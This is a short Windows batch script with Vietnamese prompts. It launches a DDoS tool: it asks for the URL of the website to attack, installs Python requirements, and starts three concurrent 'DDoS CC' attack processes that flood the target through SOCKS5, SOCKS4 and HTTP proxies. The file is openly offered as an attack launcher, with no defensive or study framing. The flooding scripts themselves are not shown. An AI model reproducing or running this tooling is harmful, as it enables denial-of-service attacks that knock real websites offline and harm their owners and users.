@echo off
echo Nhan Enter de tiep tuc. Sau khi an Enter se khoi chay 3 quy trinh tan cong DDoS CC cung luc. De co tuy chon khac, vui long su sung Termial.
set /p SETURL="Nhap URL trang web can tan cong: "
set PROXY=.\
set VERIFY=-down -check
pip3 install -r requirements.txt
pause
start ./windows/socks5.bat
start ./windows/socks4.bat
start ./windows/http.bat
exit
